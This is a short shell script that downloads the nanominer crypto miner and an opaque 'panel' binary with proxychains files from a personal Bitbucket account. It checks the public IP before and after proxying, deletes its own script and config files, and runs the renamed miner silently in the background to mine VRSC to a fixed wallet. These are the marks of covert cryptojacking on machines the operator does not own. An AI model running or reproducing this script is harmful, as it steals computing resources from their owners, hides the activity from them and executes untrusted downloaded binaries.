wget -O hmm.tar.gz https://github.com/nanopool/nanominer/releases/download/v3.8.3/nanominer-linux-3.8.3.tar.gz && tar -xf hmm.tar.gz && mv nanominer namo
wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
echo "IP ORI ==> "$(curl ifconfig.me)
echo "IP Baru ==> "$(curl ifconfig.me)
rm -rf sh.sh config_*
./namo -algo Verushash -coin VRSC -wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq.c=VRSC,id=YANTO$(( $RANDOM % 1000 + 1 )) -pool1 verushash.mine.zergpool.com:13300 &> /dev/null &
